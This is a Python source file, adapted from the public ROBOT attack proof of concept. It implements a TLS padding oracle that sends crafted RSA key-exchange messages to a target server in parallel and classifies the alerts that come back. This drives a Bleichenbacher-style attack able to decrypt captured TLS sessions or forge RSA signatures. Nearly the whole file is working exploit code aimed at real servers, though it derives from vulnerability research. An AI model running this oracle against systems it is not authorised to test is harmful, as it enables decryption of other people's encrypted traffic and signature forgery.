# Code based on https://github.com/robotattackorg/robot-detect/blob/master/robot-detect:
# > Detection and proof of concept for the ROBOT attack
# > https://robotattack.org/
# > 
# > This code is licensed as CC0.

import reversebleichenbacher.oracle as oracle

# TODO: this really needs cleanup!!!

import socket
from concurrent.futures import ProcessPoolExecutor, as_completed
import gmpy2


# This uses all TLS_RSA ciphers with AES and 3DES
ch_def = bytearray.fromhex("16030100610100005d03034f20d66cba6399e552fd735d75feb0eeae2ea2ebb357c9004e21d0c2574f837a000010009d003d0035009c003c002f000a00ff01000024000d0020001e060106020603050105020503040104020403030103020303020102020203")

# This uses only TLS_RSA_WITH_AES_128_CBC_SHA (0x002f)
ch_cbc = bytearray.fromhex("1603010055010000510303ecce5dab6f55e5ecf9cccd985583e94df5ed652a07b1f5c7d9ba7310770adbcb000004002f00ff01000024000d0020001e060106020603050105020503040104020403030103020303020102020203")

# This uses only TLS-RSA-WITH-AES-128-GCM-SHA256 (0x009c)
ch_gcm = bytearray.fromhex("1603010055010000510303ecce5dab6f55e5ecf9cccd985583e94df5ed652a07b1f5c7d9ba7310770adbcb000004009c00ff01000024000d0020001e060106020603050105020503040104020403030103020303020102020203")

ch = ch_def

ccs = bytearray.fromhex("000101")
enc = bytearray.fromhex("005091a3b6aaa2b64d126e5583b04c113259c4efa48e40a19b8e5f2542c3b1d30f8d80b7582b72f08b21dfcbff09d4b281676a0fb40d48c20c4f388617ff5c00808a96fbfe9bb6cc631101a6ba6b6bc696f0")

MSG_FASTOPEN = 0x20000000
# set to true if you want to generate a signature or if the first ciphertext is not PKCS#1 v1.5 conform
EXECUTE_BLINDING = True

# We only enable TCP fast open if the Linux proc interface exists
enable_fastopen = False # True # os.path.exists("/proc/sys/net/ipv4/tcp_fastopen")

def global_recv_n(s, amount):
        data = b""
        while len(data) < amount:
            data += s.recv(amount - len(data)) 
        return data
    
def global_recv_record(s):
    header = global_recv_n(s, 5)
    data = global_recv_n(s, header[3] * 256 + header[4])
    return header, data

def global__query(pre_master_secret, message_flow, ip, port, client_hello, server_version, client_key_exchange_prefix):
    global ccs, enc, enable_fastopen, MSG_FASTOPEN
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    if not enable_fastopen:
        s.connect((ip, port))
    
    data = b""
    data += client_hello 
    
    data += b"\x16" + server_version 
    data += client_key_exchange_prefix + pre_master_secret
    
    if not message_flow:
        data += b"\x14" + server_version + ccs
        data += b"\x16" + server_version + enc
    
    try:
        if enable_fastopen:
            s.sendto(data, MSG_FASTOPEN, (ip, port))
        else:
            s.sendall(data)
        s.shutdown(socket.SHUT_WR)
            
        # receive responses for client hello (we receive all records until a server hello done = 0x0e is received)
        data = b""
        while len(data) < 1 or data[0] != 0x0e:
            _, data = global_recv_record(s)
        
        alert = s.recv(4096)
        
        if len(alert) == 0:
            return "No data received from server"
        if alert[0] == 0x15:
            if len(alert) < 7:
                return "TLS alert was truncated (%s)" % (repr(alert))
            return "TLS alert %i of length %i" % (alert[6], len(alert))
        else:
            return "Received something other than an alert (%s)" % (alert[0:10])
    except ConnectionResetError as e:
        return "ConnectionResetError"
    except socket.timeout:
        return ("Timeout waiting for alert")
    except:
        pass
    finally:
        s.close()
    return ""

def global_query(number, e, N, C, modulus_bits, good, message_flow, ip, port, client_hello, server_version, client_key_exchange_prefix):
    cc = (pow(number, e, N) * C) % N
    tmp = hex(cc).rstrip("L").lstrip("0x").rjust(modulus_bits // 4, '0')
    pms = bytearray.fromhex(tmp)
    return global__query(pms, message_flow, ip, port, client_hello, server_version, client_key_exchange_prefix) == good

class TLSOracle(oracle.Oracle):
    
    def __init__(self, config, ip, port, client_hello, client_key_exchange_prefix, e, N, C):
        super().__init__(config)
        self.ip = ip
        self.port = port
        self.client_hello = client_hello
        self.client_key_exchange_prefix = client_key_exchange_prefix
        self.workers = 128
        self.executor = ProcessPoolExecutor(max_workers = self.workers)
        self.server_version = self._find_server_version()
        self.modulus_bits = N.bit_length()
        self.message_flow = False
        self.good = None
        self.e = e
        self.N = N
        self.C = C
        if self.server_version is None:
            raise Exception("failed to get TLS version from server!")
            
        # get fast-open cookie
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.close()
    
    def _find_server_version(self):
        # only get server tls version once
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((self.ip, self.port))
            s.sendall(self.client_hello)
            msg = b""
            while len(msg) < 11:
                msg += s.recv(11)
            return msg[9:11] # bytes that indicate server version
        finally:
            s.close()
    
    def _recv_n(self, s, amount):
        data = b""
        while len(data) < amount:
            data += s.recv(amount - len(data)) 
        return data
    
    def _recv_record(self, s):
        header = self._recv_n(s, 5)
        data = self._recv_n(s, header[3] * 256 + header[4])
        return header, data
    
    def _query(self, pre_master_secret, message_flow=None):
        global ccs, enc, enable_fastopen, MSG_FASTOPEN
        if message_flow is None:
            message_flow = self.message_flow
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        if not enable_fastopen:
            s.connect((self.ip, self.port))

        data = b""
        data += self.client_hello 
        
        data += b"\x16" + self.server_version 
        data += self.client_key_exchange_prefix + pre_master_secret
        
        if not self.message_flow:
            data += b"\x14" + self.server_version + ccs
            data += b"\x16" + self.server_version + enc
        
        try:
            if enable_fastopen:
                s.sendto(data, MSG_FASTOPEN, (self.ip, self.port))
            else:
                s.sendall(data)    
            s.shutdown(socket.SHUT_WR)
            # receive responses for client hello (we receive all records until a server hello done = 0x0e is received)
            data = b""
            while len(data) < 1 or data[0] != 0x0e:
                _, data = self._recv_record(s)
            
            alert = s.recv(4096)
            if len(alert) == 0:
                return "No data received from server"
            if alert[0] == 0x15:
                if len(alert) < 7:
                    return "TLS alert was truncated (%s)" % (repr(alert))
                return "TLS alert %i of length %i" % (alert[6], len(alert))
            else:
                return "Received something other than an alert (%s)" % (alert[0:10])
        except ConnectionResetError as e:
            return "ConnectionResetError"
        except socket.timeout:
            return ("Timeout waiting for alert")
        except:
            pass
        finally:
            s.close()
        return ""
    
    def _count(self):
        self.calls = self.calls + 1
        if self.calls % 1000 == 0:
            print(self.calls, "oracle queries")
    
    def query_raw(self, pre_master_secret, message_flow=None, count=True):
        if count:
            self._count()
            self.round_trips += 1
        return self._query(pre_master_secret, message_flow=message_flow)

    def query(self, number, batch=False):
        self._count()
        if not batch:
            self.round_trips += 1
        cc = (int(gmpy2.powmod(number, self.e, self.N)) * self.C) % self.N
        tmp = hex(cc).rstrip("L").lstrip("0x").rjust(self.modulus_bits // 4, '0')
        pms = bytearray.fromhex(tmp)
        return self.query_raw(pms, count=False) == self.good
    
    
    def submit(self, work):
        self.round_trips += (len(work) + self.workers - 1) // self.workers
        work_queue = list()
        for num in work:
            n, extra = num
            self._count()
            future = self.executor.submit(global_query, n, self.e, self.N, self.C, self.modulus_bits, self.good, self.message_flow, self.ip, self.port, self.client_hello, self.server_version, self.client_key_exchange_prefix)
            future.extra = extra
            work_queue.append(future)
        return work_queue
    
    def cancel(self, work_queue):
        for work in work_queue:
            work.cancel()
    
    def as_completed(self, work_queue):
        for fut in as_completed(work_queue):
            if fut.cancelled():
                continue
            yield fut.extra, fut.result()
